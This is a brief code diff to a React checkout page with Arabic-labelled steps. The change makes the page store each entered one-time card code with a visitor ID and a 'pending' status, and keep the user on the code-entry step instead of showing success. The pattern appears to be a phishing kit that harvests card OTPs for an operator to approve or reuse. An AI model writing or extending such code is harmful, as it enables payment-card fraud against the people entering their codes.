@@ -115,7 +115,13 @@ export default function CheckoutPage() {
       return
     }
     const visitorId = getVisitorId()
-    await addData({ visitorId, otp, currentPage: "إدخال الكود" })
+    await addData({
+      visitorId,
+      otp,
+      otpStatus: "pending",
+      currentStep: "otp",
+      currentPage: "إدخال الكود",
+    })
     setIsLoading(true)
     setOtpError("")
 
@@ -129,7 +135,7 @@ export default function CheckoutPage() {
     }
 
     setIsLoading(false)
-    setCurrentStep("success")
+    setCurrentStep("otp")
   }
 
   const formatCardNumber = (value: string) => {
